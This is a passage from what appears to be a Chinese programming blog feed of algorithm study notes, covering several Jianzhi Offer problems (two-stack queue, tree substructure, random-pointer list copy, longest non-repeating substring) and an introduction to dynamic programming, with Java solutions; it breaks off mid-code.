    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )<br><img src="/upload/2022/02/image-f6299a6985924c90bfc5abae6911ea69.png" alt="image.png"></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这一题在数据结构栈和队列的那一章有写过，并且提供了两个方法。之所以把这一题再次拿出来写一篇文章是因为这个是我做的剑指Offer第一题，从这一题开始以后每天都会刷题，对一些好的算法和思路会进行记载。</p><p>第一题在做的时候因为不熟悉力扣的编程方法，一度不知道如何编写代码。在力扣中使用Java封装好了的数据结构是不需要导入Java.util工具包的，但是在这上面编程不如IDEA舒适，没有智能提示补齐方法，导致我很容易打错方法。</p><p>此外使用封装好的这些数据结构在力扣中将泛型具体化，使用基础数据类型的包装类来进行具体化（如下面代码中的Integer）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CQueue</span> &#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack1;</span><br><span class="line">    Stack&lt;Integer&gt; stack2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        stack1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;(); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">appendTail</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        stack1.push(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteHead</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stack2.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack1.isEmpty())&#123;</span><br><span class="line">                stack2.push(stack1.pop());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stack2.isEmpty())&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="keyword">return</span> stack2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行测试，上述代码得到通过，用时和内存消耗都不算多。<br><img src="/upload/2022/02/image-2a4558878b0f4eea80f04f7461de1512.png" alt="image.png"><br>在评论区中发现有人建议使用LinkedList代替Stack进行操作，说这样效率更高<img src="/upload/2022/02/image-74ab3d2b58374c5cb3a59fc10d9d6a01.png" alt="image.png"><br>经过修改，将上述的Stack修改为LinkedList再次进行测试，执行用时快了很多<img src="/upload/2022/02/image-76b7b77654394040922707e2309a3ee2.png" alt="image.png"><br>栈中的push和pop方法LinkedList的确都有，<strong>这样以后需要使用栈和队列的算法题，均可以使用链表进行代替，效率更高</strong></p><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：对于插入和删除操作，时间复杂度均为 O(1)。插入不多说，对于删除操作，虽然看起来是 O(n) 的时间复杂度，但是仔细考虑下每个元素只会「至多被插入和弹出 stack2 一次」，因此均摊下来每个元素被删除的时间复杂度仍为 O(1)。</p><p>空间复杂度：O(n)。需要使用两个栈存储已有的元素。</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈和队列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 26. 树的子结构</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2026.%20%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2026.%20%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入两棵二叉树A和B，判断B是不是A的子结构。(约定空树不是任意一个树的子结构)<br>B是A的子结构， 即 A中有出现和B相同的结构和节点值。</p><blockquote><p>例如:<br>给定的树 A:<br>     3<br>    &#x2F; \<br>   4   5<br>  &#x2F; \<br> 1   2<br>给定的树 B：<br>   4 <br>  &#x2F;<br> 1<br>返回 true，因为 B 与 A 的一个子树拥有相同的结构和节点值。<br><img src="/upload/2022/02/image-273aa9017c8a49bda7a8ff5081f48cc8.png" alt="image.png"></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题和我学习二叉树时判断二叉树是否相等很像，但是那个是判断二叉树是否完全一样，而这个是判断一颗二叉树是否是另一颗二叉树的子结构，只需要部分一致就行，所以最开始没想出来怎么做，看了题解之后发现好简洁，但是这个思想是我怎么也写不出来的，用了递归的思想，其实是和判断二叉树是否完全相等的思想很像的，在这里记录下这题，反复学习，以后能独立写出来。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubStructure</span><span class="params">(TreeNode A, TreeNode B)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(A == <span class="literal">null</span> || B == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(A, B) || isSubStructure(A.left, B) || isSubStructure(A.right, B);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TreeNode A, TreeNode B)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(B == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(A == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> A.val == B.val &amp;&amp; dfs(A.left, B.left) &amp;&amp; dfs(A.right, B.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外附上判断两个二叉树是否相等的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Node&lt;E&gt; n1, Node&lt;E&gt; n2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(n1==<span class="literal">null</span> &amp;&amp; n2==<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n1!=<span class="literal">null</span> &amp;&amp; n2!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(n1.data==n2.data)</span><br><span class="line"><span class="keyword">return</span> equals(n1.left, n2.left) &amp;&amp; equals(n1.right, n2.right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>递归</tag>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 35. 复杂链表的复制</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2035.%20%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2035.%20%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。<br><img src="/upload/2022/02/image-bd2c34d4438040609ef7ca0cfe857a89.png" alt="image.png"><br><img src="/upload/2022/02/image-dd96e1d842a44a60be1a25dc4d3c17e0.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到这个题目最开始是没看懂，题目就是要复制一个链表，链表除了有next节点外还有一个random节点，当时想着挺奇怪的，想着直接return head不就行了？后面不通过因为力扣会检测链表的地址，如果地址和原地址一样就是没有进行复制就不会给通过，所以后面只能自己再慢慢想。后来想了挺久，想着新建一个头节点，再遍历整个数组，把数组的next节点和random节点都复制给新的头节点应该就可以了，结果还是报错，因为这样用等号把节点复制依然还是浅复制，结果还是说有节点是来自于原链表不给通过，后面只能新建节点，再进行复制，有了下面的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;  </span><br><span class="line">    Node a;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">copyRandomList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (head.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            a = <span class="keyword">new</span> <span class="title class_">Node</span>(head.val);</span><br><span class="line">            a.random = <span class="keyword">new</span> <span class="title class_">Node</span>(head.random.val);</span><br><span class="line">            a.next = <span class="keyword">new</span> <span class="title class_">Node</span>(head.next.val);</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译还是不通过，说有的节点的random节点没有正确的复制，我开始还挺纳闷，就把代码考到自己的IDEA上调试，发现的确有问题，通过我这种方法得到的链表是这样的（测试例子是 [[1,1],[2,1]] ）</p><p><img src="/upload/2022/02/image-ff21b4aa8d8c4bdb8d9879988cbb8f43.png" alt="image.png"><br>而测试例子的原链表应该是这样的<br><img src="/upload/2022/02/image-c29813c1fc48407eb67c866e85908125.png" alt="image.png"></p><p>我通过new新建的链表只有一个val值，其他的都对不上。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>没办法，最后只能看解答，解答有两种答案</p><p>第一种方法是利用<strong>哈希表</strong>，空间和时间都是O(n)，这种方法是先将原链表用哈希表先存储下来，后面再将拷贝的节点组织成一个链表就行了，这个方法比较好懂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">copyRandomList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//map中存的是(原节点，拷贝节点)的一个映射</span></span><br><span class="line">        Map&lt;Node, Node&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head; cur != <span class="literal">null</span>; cur = cur.next) &#123;</span><br><span class="line">            map.put(cur, <span class="keyword">new</span> <span class="title class_">Node</span>(cur.val));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将拷贝的新的节点组织成一个链表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> head; cur != <span class="literal">null</span>; cur = cur.next) &#123;</span><br><span class="line">            map.get(cur).next = map.get(cur.next);</span><br><span class="line">            map.get(cur).random = map.get(cur.random);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(head);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一种方法为原地修改，空间复杂度为O(1)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">copyRandomList</span><span class="params">(Node head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将拷贝节点放到原节点后面，例如1-&gt;2-&gt;3这样的链表就变成了这样1-&gt;1&#x27;-&gt;2-&gt;2&#x27;-&gt;3-&gt;3&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head, copy = <span class="literal">null</span>; node != <span class="literal">null</span>; node = node.next.next) &#123;</span><br><span class="line">            copy = <span class="keyword">new</span> <span class="title class_">Node</span>(node.val);</span><br><span class="line">            copy.next = node.next;</span><br><span class="line">            node.next = copy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把拷贝节点的random指针安排上</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head; node != <span class="literal">null</span>; node = node.next.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node.random != <span class="literal">null</span>) &#123;</span><br><span class="line">                node.next.random = node.random.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//分离拷贝节点和原节点，变成1-&gt;2-&gt;3和1&#x27;-&gt;2&#x27;-&gt;3&#x27;两个链表，后者就是答案</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newHead</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> head, temp = <span class="literal">null</span>; node != <span class="literal">null</span> &amp;&amp; node.next != <span class="literal">null</span>;) &#123;</span><br><span class="line">            temp = node.next;</span><br><span class="line">            node.next = temp.next;</span><br><span class="line">            node = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> newHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 48. 最长不含重复字符的子字符串</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2048.%20%E6%9C%80%E9%95%BF%E4%B8%8D%E5%90%AB%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2048.%20%E6%9C%80%E9%95%BF%E4%B8%8D%E5%90%AB%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请从字符串中找出一个最长的不包含重复字符的子字符串，计算该最长子字符串的长度。<br><img src="/upload/2022/02/image-d501079a4acc423e87749159421440ae.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题最开始的时候想用动态规划算法，首先想的是如何把这个问题分解成子问题，分解的思路出现了问题，最后自己瞎琢磨了半天也没写出动态规划状态方程，写的代码也有bug，看题解思路有很多，都有学习意义。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h3><p>这种方法的思路是使用set维护一个不重复的窗口。之前学算法的时候没有单独把set列出来，set同样实现collection接口，所以里面的方法基本都见过<br>1.add(Object obj)方法（详述）：<br>2.size() 方法<br>3.remove(Object  obj)方法<br>4.isEmpty()方法<br>5.clear() 方法<br>6.iterator() 迭代器<br>7.contains(Object o)方法</p><p>从下面的代码可以看出，如果出现了重复的元素，那么就会使用while循环把这个重复元素之前加入的所有元素都移除。比较每次滑动窗口的大小，最大的即是最长不含重复字符的子字符串。这种方法比较好理解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>; r &lt; s.length(); r++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(r);</span><br><span class="line">            <span class="keyword">while</span>(set.contains(c)) &#123;</span><br><span class="line">                set.remove(s.charAt(l++));</span><br><span class="line">            &#125;</span><br><span class="line">            set.add(c);</span><br><span class="line">            res = Math.max(res, r - l + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><p>这个解法和我原先的思路最像，并且补上了我没想到的地方。</p><p>若计算以下标 n 作为结尾的最大不重复子串， 首先要判断第 n 位的字符有没有出现过。这时就有两种情况 “存在字符重复”，”字符不重复”</p><p>字符不重复：最大子串长度 &#x3D; 上一位的最大子串长度 + 1<br>f(n) &#x3D; f(n - 1) + 1</p><p>存在字符重复：最大子串长度 &#x3D; 现在的位置 - 相同字符上一次出现的位置<br>f(n) &#x3D; index - lastIndex<br>该状态转移方程使用场景：<br>当第 n 位的字符若存在重复且 f(n - 1) + 1 大于 index - lastIndex<br>因为当前位置最大不重复子串长度必然不可能超过 index - lastIndex，所以此时子串长度就是 index - lastIndex。</p><p>同样，f(n - 1) + 1 小于 index - lastIndex时，这个时候说明这对重复字符串中间还存在重复字符串。f(n-1)的意义是以s[n-1]结尾的最长不重复子串，这个子串是没有重复字符的，并且这个字符一定不包含此时的z[n]，因为如果包含的话就会像上面f(n - 1) + 1 大于 index - lastIndex， 所以这里直接把z[n]当作不重复元素增加在上一个子串后，取值f(n - 1) + 1。由此就有了下面的两个不等式：</p><p><img src="/upload/2022/02/image-45993a2c012b4a4dbb854542b1422c41.png" alt="image.png"><br><img src="/upload/2022/02/image-a09b13bd987d4f91843e3ad527432bad.png" alt="image.png"></p><p><strong>解题代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>, n = s.length(), last = <span class="number">0</span>;</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">Character</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            last = Math.min(i - map.getOrDefault(c, -<span class="number">1</span>), last + <span class="number">1</span>);</span><br><span class="line">            ans = Math.max(ans, last);</span><br><span class="line">            map.put(c, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
      <tag>字符串</tag>
      
      <tag>滑动窗口</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态规划 Dynamic Programming</title>
    <link href="/2023/06/18/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%20Dynamic%20Programming/"/>
    <url>/2023/06/18/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%20Dynamic%20Programming/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="1、DP算法思想"><a href="#1、DP算法思想" class="headerlink" title="1、DP算法思想"></a>1、DP算法思想</h3><p> 　　（1）将待求解的问题分解称若干个子问题，并存储子问题的解而避免计算重复的子问题，并由子问题的解得到原问题的解。</p><p>　　 （2）动态规划算法通常用于求解具有某种最有性质的问题。</p><p>　　 （3）动态规划算法的基本要素：最优子结构性质和重叠子问题。</p><p>　　　　　　最优子结构性质：问题的最优解包含着它的子问题的最优解。即不管前面的策略如何，此后的决策必须是基于当前状态（由上一次的决策产生）的最优决策。</p><p>　　　　　　重叠子问题：在用递归算法自顶向下解问题时，每次产生的子问题并不总是新问题，有些问题被反复计算多次。对每个子问题只解一次，然后将其解保存起来，以后再遇到同样的问题时就可以直接引用，不必重新求解。</p><h3 id="2、DP算法——解决问题的基本特征"><a href="#2、DP算法——解决问题的基本特征" class="headerlink" title="2、DP算法——解决问题的基本特征"></a>2、DP算法——解决问题的基本特征</h3><p> 　　（1）动态规划一般求解最值（最优、最大、最小、最长）问题；</p><p>　　 （2）动态规划解决 的问题一般是离散的，可以分解的（划分阶段的）。</p><p>　　 （3）动态规划结局的问题必须包含最优子结构，即可以有（n-1）的最优推导出n的最优。</p><h3 id="3、DP算法——解决问题的基本步骤"><a href="#3、DP算法——解决问题的基本步骤" class="headerlink" title="3、DP算法——解决问题的基本步骤"></a>3、DP算法——解决问题的基本步骤</h3><p> 　　动态规划算法的四个步骤：</p><p>　　　　（1）刻画最优解的结构特性。（一维、二维、三维数组），<strong>找到最优策略中使用的最后一步，通过最后一步化成子问题</strong>；</p><p>　　　　（2）递归的定义最优解。（<strong>状态转移方程</strong>）</p><p>　　　　（3）<strong>确定初始条件和边界情况</strong>，以自底向上的方法来计算最优解。</p><p>　　　　（4）从计算得到的解来构造一个最优解。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="剑指-Offer-10-I-斐波那契数列"><a href="#剑指-Offer-10-I-斐波那契数列" class="headerlink" title="剑指 Offer 10- I. 斐波那契数列"></a>剑指 Offer 10- I. 斐波那契数列</h3><p>写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项（即 F(N)）。</p><p>这一题是我接触的第一道动态规划算法题，但是我做的时候并没有感觉到动态规划的思想，而是直接分析斐波那契数列的特征：1 1 2 3 5  8…，那么就设两个变量p、q，初始值都为1，再进入循环p &#x3D; p + q , q &#x3D; p - q;这样一直循环就能得到自己想要的答案了，但是作为一道动态规划题，还是要按照动态规划的思想来学习。</p><p><strong>动态规划解析</strong><br>状态定义： 设 dp 为一维数组，其中 dp[i]的值代表 斐波那契数列第 i 个数字 。<br>转移方程： dp[i + 1] &#x3D; dp[i] + dp[i -1] ，即对应数列定义 f(n + 1) &#x3D; f(n) + f(n - 1) ；<br>初始状态： dp[0] &#x3D; 0, dp[1] &#x3D; 1 ，即初始化前两个数字；<br>返回值： dp[n]，即斐波那契数列的第 n 个数字。</p><p><strong>空间复杂度优化</strong><br>由于dp列表第 i 项只与第 i-1和第 i-2项有关，因此只需要初始化三个整形变量 sum, a, b ，利用辅助变量sum使 a, b 两数字交替前进即可<br>节省了dp列表空间，因此空间复杂度降至 O(1)</p><p><strong>解题代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>, b = <span class="number">1</span>, sum;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            sum = (a + b) % <span class="number">1000000007</span>;</span><br><span class="line">            a = b;</span><br><span class="line">            b = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="剑指-Offer-63-股票的最大利润"><a href="#剑指-Offer-63-股票的最大利润" class="headerlink" title="剑指 Offer 63. 股票的最大利润"></a>剑指 Offer 63. 股票的最大利润</h3><p>假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖该股票一次可能获得的最大利润是多少？<br><img src="/upload/2022/02/image-1beb221960b849f1a34a7595e86bf4da.png" alt="image.png"><br>这一题我同样没有使用动态规划的思想依靠逻辑直接利用循环和判断语句做出来了，我做的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> 